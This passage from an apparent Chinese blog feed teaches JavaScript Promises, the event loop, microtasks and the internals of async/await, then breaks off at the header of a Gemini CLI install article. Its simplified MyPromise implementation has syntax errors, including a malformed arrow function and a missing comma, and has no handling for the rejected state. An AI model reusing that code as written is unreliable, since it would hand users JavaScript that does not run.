<p>当你调用<code>promise.then(callback)</code>时，如果 Promise 还处于 Pendding 状态，callback 函数不能被立即执行。所以，Promise 会将 callback 函数存储在一个数组中，这实际上就是订阅。当异步操作结束后,调用<code>resolve(value)</code>或<code>reject(value)</code>时，Promise 会遍历这个数组，依次将 value 传递给每个 callback 函数并执行它们，这就是发布。和一般的发布-订阅模式不同，promise 的发布-订阅稍微特殊一点，它的状态一旦改变（发布了一次），就凝固了。后续再有新的“订阅者”进来（再调用 .then），会直接拿到结果，而不需要再次触发发布动作。</p>
<p>下面是一个简单的示例，展示了 Promise 中发布-订阅模式的实现原理：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">EventEmitter</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"/>) {
    <span class="hljs-comment">//1.缓存列表，用来存放所有的订阅回调函数</span>
    <span class="hljs-comment">//结构类似于{'click': [fn1, fn2], 'upload':[fn3]}</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">events</span> = {};
  }

  <span class="hljs-comment">//2.订阅(Subscribe)</span>
  <span class="hljs-comment">//相当于点击了"关注"按钮</span>
  <span class="hljs-title function_">on</span>(<span class="hljs-params">eventName, callback</span>) {
    <span class="hljs-comment">//如果还没有这个事件的队列，就初始化一个空数组</span>
    <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">this</span>.<span class="hljs-property">events</span>[eventName]) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">events</span>[eventName] = [];
    }
    <span class="hljs-comment">//把回调函数推入队列</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">events</span>[eventName].<span class="hljs-title function_">push</span>(callback);
  }

  <span class="hljs-comment">//3.发布(Publish)</span>
  <span class="hljs-comment">//相当于发布了一条动态，通知所有关注我的人</span>
  <span class="hljs-title function_">emit</span>(<span class="hljs-params">eventName, ...args</span>) {
    <span class="hljs-comment">//取出该事件所对应的所有回调函数</span>
    <span class="hljs-keyword">const</span> callbacks = <span class="hljs-variable language_">this</span>.<span class="hljs-property">events</span>[eventName];

    <span class="hljs-keyword">if</span> (callbacks) {
      <span class="hljs-comment">//依次执行回调函数，并传入参数</span>
      callbacks.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">callback</span>) =&gt;</span> {
        <span class="hljs-title function_">callback</span>(...args);
      });
    }
  }

  <span class="hljs-comment">//4.取消订阅(Unsubscribe)</span>
  <span class="hljs-comment">//相当于取关</span>
  <span class="hljs-title function_">off</span>(<span class="hljs-params">eventName, callback</span>) {
    <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">this</span>.<span class="hljs-property">events</span>[eventName]) <span class="hljs-keyword">return</span>;
    <span class="hljs-comment">//过滤掉要取消的那个函数</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">events</span>[eventName] = <span class="hljs-variable language_">this</span>.<span class="hljs-property">events</span>[eventName].<span class="hljs-title function_">filter</span>(
      <span class="hljs-function">(<span class="hljs-params">cb</span>) =&gt;</span> cb !== callback
    );
  }
}

<span class="hljs-comment">//使用示例</span>

<span class="hljs-keyword">const</span> bus = <span class="hljs-keyword">new</span> <span class="hljs-title class_">EventEmitter</span>();

bus.<span class="hljs-title function_">on</span>(<span class="hljs-string">"eat"</span>, <span class="hljs-function">(<span class="hljs-params">food</span>) =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`我正在吃<span class="hljs-subst">${food}</span>`</span>);
});

bus.<span class="hljs-title function_">on</span>(<span class="hljs-string">"eat"</span>, <span class="hljs-function">(<span class="hljs-params">food</span>) =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`他也想吃<span class="hljs-subst">${food}</span>`</span>);
});

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"还没开饭"</span>);

bus.<span class="hljs-title function_">emit</span>(<span class="hljs-string">"eat"</span>, <span class="hljs-string">"咖喱饭"</span>); <span class="hljs-comment">// 发布事件</span>

<span class="hljs-comment">/*
输出结果：
还没开饭
我正在吃咖喱饭
他也想吃咖喱饭
*/</span>
</code></pre>
<p>在上面的代码中，<code>EventEmitter</code>类实现了一个简单的发布-订阅系统。<code>on</code>方法用于订阅事件，<code>emit</code>方法用于发布事件，<code>off</code>方法用于取消订阅。通过这种方式，Promise 能够有效地管理异步操作的回调函数，实现异步处理。</p>
<h3 data-id="heading-10">微任务队列</h3>
<h4 data-id="heading-11">微任务队列导入</h4>
<p>上面的例子中提到了队列的概念。在 JavaScript 中，微任务队列（Microtask Queue）是一个特殊的任务队列，用于存放需要在当前执行栈清空后立即执行的任务。即使<code>resolve</code>是同步调用的，<code>.then</code>中的代码也不会立即执行。Promise 的回调函数（通过<code>then</code>和<code>catch</code>注册的函数）会被放入微任务队列中。要解释清楚这个机制，下面我来详细介绍一下 JavaScript 的事件循环（Event Loop）。</p>
<h4 data-id="heading-12">JavaScript 的事件循环</h4>
<p>JavaScript 是单线程语言，这意味着它一次只能执行一个任务。为了处理异步操作，JavaScript 引入了事件循环机制。可以将三者的关系理解为：银行柜台办业务。</p>
<h5 data-id="heading-13">宏任务</h5>
<p>宏任务(MacroTask)是"主流"的异步任务，可以理解为银行柜台等待办理业务的一个个独立的客户。每次执行栈(主线程)清空后，事件循环会从宏任务队列中取出下一个宏任务来执行，且每次只能执行一个宏任务，执行完一个后，浏览器会去检查微任务队列，或者进行页面渲染。常见的宏任务包括：</p>
<ul>
<li><code>setTimeout</code></li>
<li><code>setInterval</code></li>
<li><code>setImmediate</code> (Node.js 环境)</li>
<li>I/O 操作</li>
<li>UI 渲染</li>
</ul>
<h5 data-id="heading-14">微任务</h5>
<p>微任务(MicroTask)是依附于当前宏任务的紧急任务，它的优先级要高于宏任务，当前宏任务结束后，下一个宏任务开始前，会先清空微任务队列。可以理解为当前正在办业务的客户存完钱后又想办点别的业务，这时候这个客户具有"插队"的权利来办理业务。一旦开始执行微任务，就会把微任务队列清空为止，包括在执行微任务期间新产生的微任务。常见的微任务包括：</p>
<ul>
<li><code>Promise</code>的回调函数（通过<code>then</code>和<code>catch</code>注册的函数）</li>
<li><code>MutationObserver</code></li>
<li><code>process.nextTick</code> (Node.js 环境)</li>
</ul>
<h5 data-id="heading-15">事件循环</h5>
<p>事件循环(Event Loop)是 JavaScript 处理异步操作的核心机制。它不断地检查执行栈和任务队列，当执行栈为空时，它会从宏任务队列中取出下一个宏任务来执行。在所有同步代码或每个宏任务执行完后，事件循环会检查微任务队列，并执行所有的微任务，如果执行微任务产生了新的微任务，那新的微任务就会被加到队尾并在本轮一起执行完，直到微任务队列为空，然后才会继续处理下一个宏任务。可以将事件循环理解为银行的叫号系统和柜员的工作流程。事件循环的标准流程大致如下：</p>
<ul>
<li>执行栈 (Call Stack)： 首先执行主线程中的同步代码。</li>
<li>清空微任务队列： 当同步代码执行完毕（或一个宏任务执行完毕），立即检查微任务队列。</li>
<li>如果有微任务，全部执行完（清空队列）。</li>
<li>如果在执行微任务时产生了新的微任务，继续加到队尾并在本轮一起执行完。</li>
<li>渲染 UI (可选)： 浏览器判断是否需要更新页面视图。</li>
<li>执行一个宏任务： 从宏任务队列中取出一个（最老的）任务执行。</li>
<li>回到步骤 2（循环往复）。</li>
</ul>
<h5 data-id="heading-16">事件循环示例</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"1. Script Start (同步)"</span>);

<span class="hljs-comment">//宏任务1</span>
<span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"4. setTimeout (宏任务)"</span>);

  <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>().<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"5. Promise in setTimeout (微任务)"</span>);
  });
}, <span class="hljs-number">0</span>);

<span class="hljs-comment">// 微任务1</span>
<span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve</span>) =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"2. Promise Executor (同步)"</span>);
  <span class="hljs-title function_">resolve</span>();
}).<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"3. Promise then (微任务)"</span>);
});

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"6. Script End (同步)"</span>);

<span class="hljs-comment">/*输出结果：
1. Script Start (同步)
2. Promise Executor (同步)
6. Script End (同步)
3. Promise then (微任务)
4. setTimeout (宏任务)
5. Promise in setTimeout (微任务)
*/</span>
</code></pre>

































































<table><thead><tr><th align="left">时间节点</th><th align="left">正在执行 (Call Stack)</th><th align="left">微任务队列 (Micro Queue)</th><th align="left">宏任务队列 (Macro Queue)</th></tr></thead><tbody><tr><td align="left"><strong>1. 启动</strong></td><td align="left"><strong>Script (Macro #1)</strong></td><td align="left"><code>[]</code></td><td align="left"><code>[]</code></td></tr><tr><td align="left"><strong>2. 运行中</strong></td><td align="left"><code>console.log(1)...</code></td><td align="left"><code>[Promise回调]</code></td><td align="left"><code>[setTimeout回调]</code></td></tr><tr><td align="left"><strong>3. Script 结束</strong></td><td align="left"><em>(空)</em></td><td align="left"><code>[Promise回调]</code></td><td align="left"><code>[setTimeout回调]</code></td></tr><tr><td align="left"><strong>4. 清算微任务</strong></td><td align="left"><strong>执行 Promise 回调</strong></td><td align="left"><code>[]</code></td><td align="left"><code>[setTimeout回调]</code></td></tr><tr><td align="left"><strong>5. 第一轮结束</strong></td><td align="left"><em>(空)</em></td><td align="left"><code>[]</code></td><td align="left"><code>[setTimeout回调]</code></td></tr><tr><td align="left"><strong>6. 启动第二轮</strong></td><td align="left"><strong>执行 setTimeout</strong></td><td align="left"><code>[]</code></td><td align="left"><code>[]</code></td></tr><tr><td align="left"><strong>7. 运行中</strong></td><td align="left"><code>console.log(4)...</code></td><td align="left"><code>[内部新回调]</code></td><td align="left"><code>[]</code></td></tr><tr><td align="left"><strong>8. 宏任务结束</strong></td><td align="left"><em>(空)</em></td><td align="left"><code>[内部新回调]</code></td><td align="left"><code>[]</code></td></tr><tr><td align="left"><strong>9. 清算微任务</strong></td><td align="left"><strong>执行 内部新回调</strong></td><td align="left"><code>[]</code></td><td align="left"><code>[]</code></td></tr></tbody></table>
<h3 data-id="heading-17">Promise 链式调用</h3>
<p>Promise 支持<code>.then()</code>链式调用，这是因为<code>then()</code>和<code>catch()</code>方法内部会返回一个新的 Promise 实例(不是原来那个)，使得可以在前一个 Promise 处理完成后继续处理下一个 Promise。如果前一个<code>then</code>或<code>catch</code>中返回一个值，这个值会被传递给下一个<code>then</code>的回调函数；如果返回一个 Promise，则下一个<code>then</code>会等待这个 Promise 状态改变后再执行。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> promise = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> {
  <span class="hljs-title function_">resolve</span>(<span class="hljs-number">1</span>);
});

promise
  .<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">value</span>) =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(value); <span class="hljs-comment">// 输出: 1</span>
    <span class="hljs-keyword">return</span> value + <span class="hljs-number">1</span>;
  })
  .<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">value</span>) =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(value); <span class="hljs-comment">// 输出: 2</span>
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve</span>) =&gt;</span> {
      <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">resolve</span>(value + <span class="hljs-number">1</span>), <span class="hljs-number">1000</span>);
    });
  })
  .<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">value</span>) =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(value); <span class="hljs-comment">// 输出: 3 (延迟1秒后)</span>
  });
</code></pre>
<h3 data-id="heading-18">Promise 的简易版原理实现</h3>
<p>下面是一个简易版的 Promise 实现，展示了其基本原理：</p>
<pre><code class="hljs language-javascript" lang="javascript">
<span class="hljs-keyword">class</span> <span class="hljs-title class_">MyPromise</span> {
    <span class="hljs-title function_">constructor</span>(<span class="hljs-params">executor</span>) {
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span> = <span class="hljs-string">'pending'</span>;<span class="hljs-comment">// 初始状态</span>
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">value</span> = <span class="hljs-literal">undefined</span>;<span class="hljs-comment">// 成功的值</span>
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">callbacks</span> = [];<span class="hljs-comment">//订阅者队列</span>

        <span class="hljs-keyword">const</span> <span class="hljs-title function_">resolve</span> = (<span class="hljs-params">value</span>) =&gt; {
            <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span> === <span class="hljs-string">'pending'</span>) {
                <span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span> = <span class="hljs-string">'fulfilled'</span>;
                <span class="hljs-variable language_">this</span>.<span class="hljs-property">value</span> = value;
                <span class="hljs-comment">//发布：执行所有订阅的回调(需放入微任务队列，此处简化直接调用)</span>
                <span class="hljs-variable language_">this</span>.<span class="hljs-property">callbacks</span>.<span class="hljs-title function_">forEach</span>(cb = &gt; cb.<span class="hljs-title function_">onFulfilled</span>(value));
            }
        }

        <span class="hljs-keyword">const</span> <span class="hljs-title function_">reject</span> = (<span class="hljs-params">reason</span>) =&gt; {
            <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span> === <span class="hljs-string">'pending'</span>) {
                <span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span> = <span class="hljs-string">'rejected'</span>;
                <span class="hljs-variable language_">this</span>.<span class="hljs-property">value</span> = reason;
                <span class="hljs-comment">//发布：执行所有订阅的回调(需放入微任务队列，此处简化直接调用)</span>
                <span class="hljs-variable language_">this</span>.<span class="hljs-property">callbacks</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">cb</span> =&gt;</span> cb.<span class="hljs-title function_">onRejected</span>(reason));
            }
        }

        <span class="hljs-comment">//立即执行 executor</span>
        <span class="hljs-keyword">try</span> {
            <span class="hljs-title function_">executor</span>(resolve, reject);
        } <span class="hljs-keyword">catch</span> (error) {
            <span class="hljs-title function_">reject</span>(error);
        }
    }

    <span class="hljs-title function_">then</span>(<span class="hljs-params">onFulfilled, onRejected</span>) {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyPromise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> {
            <span class="hljs-comment">//如果是pending状态，存入订阅队列</span>
            <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span> === <span class="hljs-string">'pending'</span>) {
                <span class="hljs-variable language_">this</span>.<span class="hljs-property">callbacks</span>.<span class="hljs-title function_">push</span>({
                    <span class="hljs-attr">onFulfilled</span>: <span class="hljs-function"><span class="hljs-params">val</span> =&gt;</span> {
                        <span class="hljs-keyword">try</span> {
                            <span class="hljs-keyword">const</span> result = <span class="hljs-title function_">onFulfilled</span>(val);
                            <span class="hljs-title function_">resolve</span>(result);<span class="hljs-comment">//处理链式调用</span>
                        } <span class="hljs-keyword">catch</span> (err) { <span class="hljs-title function_">reject</span>(err); }
                    }
                    <span class="hljs-attr">onRejected</span>: <span class="hljs-function"><span class="hljs-params">reason</span> =&gt;</span> {
                        <span class="hljs-keyword">try</span> {
                            <span class="hljs-keyword">const</span> result = <span class="hljs-title function_">onRejected</span>(reason);
                            <span class="hljs-title function_">resolve</span>(result);
                        } <span class="hljs-keyword">catch</span> (err) { <span class="hljs-title function_">reject</span>(err); }
                    }
                })
            } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span> === <span class="hljs-string">'fulfilled'</span>) {
                <span class="hljs-comment">//如果已经是fulfilled状态，利用微任务执行</span>
                <span class="hljs-title function_">queueMicrotask</span>(<span class="hljs-function">() =&gt;</span> {
                    <span class="hljs-keyword">const</span> result = <span class="hljs-title function_">onFulfilled</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">value</span>);
                    <span class="hljs-title function_">resolve</span>(result);<span class="hljs-comment">//处理链式调用</span>
                })
            }
        })
    }
}

</code></pre>
<h2 data-id="heading-19">Async/Await 简介</h2>
<p>async 和 await 是基于 Promise 的语法糖，能够让我们用同步代码的风格编写异步代码，这样可以提高代码的可读性。</p>
<h3 data-id="heading-20">async 和 await 解决了什么问题？</h3>
<p>Promise 虽然解决了"回调地狱"的问题，但引入了链式复杂性，使得代码在处理多个异步操作时任然显得冗长和难以阅读。async/await 通过让异步代码看起来像同步代码，极大地提升了代码的可读性和维护性。</p>
<h4 data-id="heading-21">如果链式调用太长</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title function_">fetchData</span>()
  .<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">data</span>) =&gt;</span> <span class="hljs-title function_">processData</span>(data))
  .<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">processedData</span>) =&gt;</span> <span class="hljs-title function_">saveData</span>(processedData))
  .<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"All done!"</span>))
  .<span class="hljs-keyword">catch</span>(<span class="hljs-function">(<span class="hljs-params">error</span>) =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(error));
</code></pre>
<p>这样的代码虽然避免了回调地狱，但仍然显得冗长，且可读性差。</p>
<h4 data-id="heading-22">使用 async/await 重写</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">handleData</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetchData</span>();
    <span class="hljs-keyword">const</span> processedData = <span class="hljs-keyword">await</span> <span class="hljs-title function_">processData</span>(data);
    <span class="hljs-keyword">await</span> <span class="hljs-title function_">saveData</span>(processedData);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"All done!"</span>);
  } <span class="hljs-keyword">catch</span> (error) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(error);
  }
}

<span class="hljs-title function_">handleData</span>();
</code></pre>
<p>通过使用 async/await，代码变得更加简洁和易读，逻辑流程也更加清晰。</p>
<h3 data-id="heading-23">async 和 await 的使用</h3>
<h4 data-id="heading-24">使用示例</h4>
<p>要使用 async/await，只需在函数前加上<code>async</code>关键字，并在需要等待 Promise 结果的地方使用<code>await</code>关键字。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">fetchData</span>(<span class="hljs-params"/>) {
  <span class="hljs-comment">// 模拟异步数据获取</span>
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve</span>) =&gt;</span> {
    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
      <span class="hljs-title function_">resolve</span>(<span class="hljs-string">"数据已获取"</span>);
    }, <span class="hljs-number">1000</span>);
  });
}

<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"开始获取数据..."</span>);
  <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetchData</span>();
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data); <span class="hljs-comment">// 输出: 数据已获取</span>
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"数据处理完成"</span>);
}

<span class="hljs-title function_">main</span>();
</code></pre>
<h3 data-id="heading-25">async 和 await 原理</h3>
<h4 data-id="heading-26">async 函数的原理</h4>
<p><code>async</code>关键字的作用是为函数提供一个 Promise 包装器和状态机环境。当一个函数被定义为<code>async</code>函数时，JS 引擎会保证该函数的返回值永远是一个 Promise 对象。如果函数内部返回一个非 Promise 值，JS 引擎会自动将其包装成一个已解决的 Promise。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">f</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
}

<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">g</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">"出错了"</span>);
}
</code></pre>
<p>上面的代码等同于下面的实现：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">f</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>(<span class="hljs-number">1</span>);
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">g</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">reject</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">"出错了"</span>));
}
</code></pre>
<h4 data-id="heading-27">await 的原理</h4>
<p><code>await</code>是实现暂停和恢复的关键。当 JS 引擎遇到<code>await</code>时，它会执行以下三个核心步骤：</p>
<h5 data-id="heading-28">等待 Promise 结果</h5>
<p>引擎首先评估<code>await</code>右侧的表达式，如果右侧的是一个非 Promise 值(如 await 10)，引擎会立即将其视为<code>Promise.resolve(10)</code>，并以微任务的形式继续执行(当在大多数现代 JS 引擎中，这种情况下会优化成同步执行)。如果右侧是一个 Promise 对象，JS 引擎会"暂停"当前 async 函数的执行，指导该 Promise 状态确定。</p>
<h5 data-id="heading-29">让出控制权(Yield)</h5>
<p>这是<code>await</code>关键的动作。首先引擎暂停函数，将当前 async 函数的执行状态保存在内部的“状态机”中，标记为暂停。然后让出线程，主线程立即恢复执行<code>async</code>函数后面的同步代码。这保证了<code>await</code>不会阻塞整个 JS 进程。</p>
<h5 data-id="heading-30">作为微任务恢复执行</h5>
<p>当<code>await</code>等待的 Promise 状态确定(无论是 fulfilled 还是 rejected)后，引擎会调度，将<code>async</code>函数中<code>await</code>后面的所有代码作为一个回调，放入微任务队列。之后在 Event Loop 的下一个微任务清算周期，该回调被执行，<code>async</code>函数从上次暂停的地方恢复执行，并拿到 Promise 的结果。</p>
<h4 data-id="heading-31">核心机制</h4>
<p>要真正理解 async 和 await 的原理，需要知道它在底层是如何被转换的。在概念上，async/await 代码被编译成了一个使用<code>Generator</code>函数和<code>Promise</code>包装的函数。</p>
<h5 data-id="heading-32">转换示例</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">fetchUser</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> id = <span class="hljs-keyword">await</span> <span class="hljs-title function_">getId</span>(); <span class="hljs-comment">//暂停点1</span>
  <span class="hljs-keyword">const</span> info = <span class="hljs-keyword">await</span> <span class="hljs-title function_">getInfo</span>(id); <span class="hljs-comment">//暂停点2</span>
  <span class="hljs-keyword">return</span> info;
}

<span class="hljs-comment">// 转换后等同于：</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">fetchUser</span>(<span class="hljs-params"/>) {
  <span class="hljs-comment">//1.返回一个Promise包装整个逻辑</span>
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> {
    <span class="hljs-comment">//2.启动一个Generator状态机</span>
    <span class="hljs-keyword">const</span> generator = <span class="hljs-title function_">actualFunctionGenerator</span>();

    <span class="hljs-comment">//3.核心驱动函数</span>
    <span class="hljs-keyword">function</span> <span class="hljs-title function_">step</span>(<span class="hljs-params">nextPromise</span>) {
      <span class="hljs-keyword">const</span> next = generator.<span class="hljs-title function_">next</span>(nextPromise); <span class="hljs-comment">//启动/恢复函数</span>
      <span class="hljs-keyword">if</span> (next.<span class="hljs-property">done</span>) {
        <span class="hljs-comment">//如果运行到函数末尾,Promise成功</span>
        <span class="hljs-keyword">return</span> <span class="hljs-title function_">resolve</span>(next.<span class="hljs-property">value</span>);
      }
      <span class="hljs-comment">//如果遇到yield(相当于await)，继续驱动</span>
      <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>(next.<span class="hljs-property">value</span>).<span class="hljs-title function_">then</span>(step, reject);
    }

    <span class="hljs-comment">//首次运行</span>
    <span class="hljs-title function_">step</span>();
  });
}
</code></pre>
<p>这里<code>await</code>对应着<code>yield</code>，标记暂停点，让出控制权。<code>Promise.resolve.then()</code>对应着恢复执行，确保<code>await</code>后面的代码以微任务的形式被调度。因此我们可以得出，async/await 的原理就是引擎将同步的写法，在编译阶段高效地转化成了基于 Promise 和微任务的异步流程控制。</p>
<h2 data-id="heading-33">结语</h2>
<p>到此为止，我们已将 JavaScript 中的 Promise 及其相关概念进行了全面的介绍。从 Promise 的基本概念、状态管理，到其背后的发布-订阅模式和微任务队列机制，再到 async/await 的语法糖及其原理，我们深入探讨了异步编程在 JavaScript 中的实现方式。现在我们可以把这三个概念穿通一下：Event Loop 是底层机制-&gt;Promise 是核心对象-&gt;Async/Await 是最佳写法。希望本文对你有所帮助。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[在 Windows 系统上安装官方 Gemini CLI 教程]]></title>    <link>https://juejin.cn/post/7574382900859928603</link>    <guid>https://juejin.cn/post/7574382900859928603</guid>    <pubDate>2025-11-20T05:40:24.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7574382900859928603" data-draft-id="7574584245151645747" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="在 Windows 系统上安装官方 Gemini CLI 教程"/> <meta itemprop="keywords" content="Gemini,AI编程"/> <meta itemprop="datePublished" content="2025-11-20T05:40:24.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="不老刘"/> <meta itemprop="url" content="https://juejin.cn/user/3537575016664123"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            在 Windows 系统上安装官方 Gemini CLI 教程
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3537575016664123/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    不老刘
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-20T05:40:24.000Z" title="Thu Nov 20 2025 05:40:24 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-20
